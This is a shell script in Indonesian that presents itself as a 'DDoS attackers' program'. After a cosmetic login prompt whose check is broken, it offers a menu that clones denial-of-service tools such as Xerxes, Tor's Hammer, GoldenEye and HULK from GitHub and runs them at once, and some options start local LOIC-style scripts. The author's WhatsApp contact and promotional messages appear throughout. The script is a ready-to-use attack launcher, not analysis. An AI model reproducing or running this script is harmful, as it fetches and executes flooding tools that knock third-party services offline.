#!/bin/sh

Cy='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
e='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
mer='\033[41;97m' #Tepi
R='\x1b[1;31m'
G='\x1b[1;32m'
B='\x1b[1;34m'
Y='\x1b[1;33m'
C='\x1b[1;36m'
D='\x1b[0m'
endc='\E[0m'
enda='\033[0m'
figlet -f pagga "Login Dulu" |lolcat -a -d 5
echo $me"╔══════════╗"
read -p "║ Username :" lu
echo $pu"║"
read -p "║ Password :" tod
echo $pu"╚══════════╝"

if [ $lu = "MR.404" ]|[ $tod = "HACKER" ]
then
echo $cy"Login Sukses"
echo $me"chat auothor dulu!!!"
sleep 3
xdg-open 'https://wa.me/6282331072836/?text=Assalamualaikum+Apa+kabar+MR.404'
fi




      echo $me"●▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬●"
      echo $e"|WELCOME TO MY 9-DDOS ATTACKERS-PROGRAMS |"     
      echo $i"|       BY : Raihan / MR.404             |"  
     echo $ku"|Jangan Lupa Subsçribe Çhannel Aing yeee |"
      echo $e"|           *MUHAMMAD RAIHAN*            |"
      echo $i"|         INDONYMOUS CYBER TEAM          |"
      echo $me"|<--------------------------------------------->|" 
sleep 1                                                   

echo $i"1."$e"HAMMERING DDOS "
echo $i"2."$me"Xerxes DDOS Tools"
echo $i"3."$ku"DDoS (Trojan) "
echo $i"4."$me"TOR's Hammer DDOS "
echo $i"5."$me"HUNNER DDOS(SADEES)"
echo $i"6."$me"Golden EYES DDoS (SADEES)"
echo $i"7."$me"HULK Smash!!"
echo $i"8."$me"ip-hack"
echo $i"9."$me"LOIC (GANAAAASS)"
echo $i"10."$me"ARMAGEDDON DDOS"
echo $i"11."$i"KELUAR PROGRAM"
echo
read -p"Mau Pake Yang Nomer Berapa? : " pil

if [ $pil = 1 ]
then
clear
git clone https://github.com/cyweb/hammer
cd hammer
python3 hammer.py
fi

if [ $pil = 2 ]
then
clear
apt install clang
git clone https://github.com/zanyarjamal/xerxes
cd xerxes
clang xerxes.c -o xerxes
./xerxes
fi

if [ $pil = 3 ]
then
clear
git clone https://github.com/MR404cyber/DDOS
cd DDOS
python2 ddos.py
fi

if [ $pil = 4 ]
then
clear
apt install tor
git clone https://github.com/dotfighter/torshammer
cd torshammer
python2 torshammer.py
fi

if [ $pil = 5 ]
then
clear
git clone https://github.com/b3-v3r/Hunner
cd hunner
python hunner.py
fi

if [ $pil = 6 ]
then
clear
git clone https://github.com/jseidl/GoldenEye
cd GoldenEye
python2 goldeneye.py
fi

if [ $pil = 7 ]
then
clear
git clone https://github.com/grafov/hulk
cd hulk
python hulk.py
fi

if [ $pil = 8 ]
then
clear
git clone https://github.com/MR404cyber/ip-hack
cd ip-hack
python2 Ip-hack
fi

if [ $pil = 9 ]
then
clear
termux-setup-storage
cd /sdcard/BloodsTools71/10Attack/5
python2 LO1C.py
fi

if [ $pil = 10 ]
then
clear
termux-setup-storage
cd /sdcard/BloodsTools71/10Attack/5
python2 arma.py
fi


if [ $pil = 11 ]
then
clear
echo $me"Terima Kasih sudh pakai Tools saya ^_^"
sleep 2
echo $cy"Jangan Lupa Subscribe Channelku Yah ^_^"
sleep 2
echo $cy"Kalau Ada error silahkan hubungi saya di WA"
sleep 2
echo $i"Youtube : MR.404 "
echo $i"Whatsapp : +6282331072836 "
fi
